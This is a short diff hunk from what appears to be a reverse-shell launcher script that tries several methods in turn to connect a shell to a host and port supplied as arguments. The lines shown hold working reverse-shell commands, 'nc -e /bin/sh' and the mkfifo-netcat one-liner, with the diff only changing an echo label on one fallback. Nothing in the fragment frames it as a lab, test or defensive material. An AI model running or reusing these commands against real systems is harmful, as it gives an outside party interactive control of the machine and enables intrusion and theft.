@@ -7,7 +7,7 @@ echo "**starting**"
 } || { 
 	echo "Method: netcat" &&       	nc -e /bin/sh $1 $2
 } || {
-	echo "Method: alt netcat"  &&       	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f
+	echo "Method: netcat no -e"  &&       	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f
 } || {       	
 	echo "All methods failed" 
 }
